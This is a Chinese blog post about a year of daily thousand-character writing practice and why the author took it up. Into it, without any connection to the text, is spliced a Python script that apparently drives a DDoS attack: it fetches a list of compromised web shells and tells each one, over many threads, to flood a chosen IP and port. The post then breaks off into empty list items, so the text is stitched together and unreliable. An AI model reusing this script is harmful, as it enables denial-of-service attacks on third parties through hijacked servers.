---
layout: post
title: 如何正确地练习写作
date: 2015-3-02
categories: blog
tags: [总结,知识管理]
description: 通告一下，我已不再每天写千字文，准备采用以下的方法进行练习，由于文章篇幅较长，链接较多，建议到简书或博客进行阅读。
---

## 初心

2014年2月10日，我开始每天写千字文，到现在（2015年3月3日）已超一年，在这期间，我写了347篇文章，全部放在我的博客（cnfeat.com）和公众号（cnfeat）上。

起初我练习千字文的目的很简单：锻炼思考、表达、总结和分享的能力，通过写来提升自己。

写的作用，《重来》这本书说：

>如果准备在一堆人中挑出一个人来做某份工作，那就挑写作能力最好的那个。至于他有没有做过市场、销售、设计、编程或其他什么，倒并不那么重。他们的写作能力迟早会带来好处的。
>
>这是因为，一个会写作的人，他厉害之处可不仅仅是会写作而已。文法清晰代表思路明晰。那些会写作的人懂得如何与他人进行沟通。他们使得事情变得更好理解了。他们擅于换位思考。他们懂得抓住重点。这些都是你想在一个应聘者身上看到的特质。

一年前，我没有写作的习惯，既然要写，就先养成写作的习惯，当时恰好看到王佩的[《每天写一篇千字文靠谱吗？》](http://www.baibanbao.net/2014/02/02/is-it-possible-to-write-1000-words-per-day.html)，和简叔的[《如何坚持每天写一千字》](http://www.jianshu.com/p/53eea6022d58)，我当时就想，既然他们都说好，那我就开练吧。

我当时练习千字文还有两个目的：

一是想锻炼自己持续做一件事的能力

二是想通过写来逼自己更多地接触外界，接收更多的信息（阅读、观影、外出、社交……）通过持续的信息输出来强制自己进行信息输入。

这样做带来效果还不错，起码在此期间，千字文的压力迫使我去阅读书籍，写读书笔记，参加社会活动，组建写作社群，认识了各行业的人，这对当时的我都是非常有益的。

这期间，我自己摸索了一点写作的经验，大家可以去博客看看[「千字文与写作」](http://cnfeat.com/categories/%E5%8D%83%E5%AD%97%E6%96%87%E4%B8%8E%E5%86%99%E4%BD%9C/)的分类，虽然比较稚嫩，但是毕竟也是真实的记录，相当有比较意义。

``` python
def gethash(code):
    m = sha256()
    m.update(code)
    return m.hexdigest()
def fire(host,ip,seconds,port):
    try:
        reply = urllib.urlopen(host).read()
        if 'engine' in reply:
            urlopen(host+"?act=engine&host="+ip+"&time="+seconds+"&port="+port).read()
        else:
            urlopen(host+"?act=phptools&host="+ip+"&time="+seconds+"&port="+port).read()  
    except:
        pass
def shellBoot(time, threads, ip, port, shellist):
    hosts = urlopen(shellist).read().split()
    for host in hosts:
        for x in range(0,threads):
            while 1:
                worked=False
                try:
                    start_new_thread(fire,(host,ip,time,port))
                    worked=True
                except:
                    pass
                if worked == True:
                    break
```

1. 
2. 
3. 









